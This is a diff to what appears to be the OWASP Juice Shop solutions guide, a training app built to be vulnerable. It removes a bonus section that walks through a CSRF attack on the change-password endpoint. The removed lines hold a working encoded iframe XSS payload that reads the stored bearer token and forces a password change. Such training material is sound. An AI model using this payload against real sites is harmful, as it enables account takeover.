@@ -1291,40 +1291,6 @@ explains the problem and gives an exploit example:
 
    ![CSRF-like request via PostMan](img/csrf_postman.png)
 
-#### Bonus Round: Cross Site Request Forgery
-
-If you want to craft an actual CSRF attack against
-`/rest/user/change-password` you will have to invest a bit extra work,
-because a simple attack like _Search_ for `<img
-src="http://localhost:3000/rest/user/change-password?new=slurmCl4ssic&repeat=slurmCl4ssic">`
-will not work. Making someone click on the corresponding attack link
-<http://localhost:3000/#/search?q=%3Cimg%20src%3D%22http:%2F%2Flocalhost:3000%2Frest%2Fuser%2Fchange-password%3Fnew%3DslurmCl4ssic%26repeat%3DslurmCl4ssic%22%3E>
-will return a `500` error when loading the image URL with a message
-clearly stating that your attack ran against a security-wall: `Error:
-Blocked illegal activity`
-
-To make this exploit work, some more sophisticated attack URL is
-required:
-
-<http://localhost:3000/#/search?q=%3Ciframe%20src%3D%22javascript%3Axmlhttp%20%3D%20new%20XMLHttpRequest%28%29%3B%20xmlhttp.open%28%27GET%27%2C%20%27http%3A%2F%2Flocalhost%3A3000%2Frest%2Fuser%2Fchange-password%3Fnew%3DslurmCl4ssic%26amp%3Brepeat%3DslurmCl4ssic%27%29%3B%20xmlhttp.setRequestHeader%28%27Authorization%27%2C%60Bearer%3D%24%7BlocalStorage.getItem%28%27token%27%29%7D%60%29%3B%20xmlhttp.send%28%29%3B%22%3E>
-
-Pretty-printed this attack is easier to understand:
-
-```html
-<iframe src="javascript:xmlhttp = new XMLHttpRequest();
-   xmlhttp.open('GET', 'http://localhost:3000/rest/user/change-password?new=slurmCl4ssic&amp;repeat=slurmCl4ssic');
-   xmlhttp.setRequestHeader('Authorization',`Bearer=${localStorage.getItem('token')}`);
-   xmlhttp.send();">
-</iframe>
-```
-
-Anyone who is logged in to the Juice Shop while clicking on this link
-will get their password set to the same one we forced onto Bender!
-
-:clap: Kudos to Joe Butler, who originally described this kind of CSRF
-payload in his blog post
-[Hacking(and automating!) the OWASP Juice Shop](https://incognitjoe.github.io/hacking-the-juice-shop.html).
-
 ### Dumpster dive the Internet for a leaked password and log in to the original user account it belongs to
 
 :wrench: **TODO**
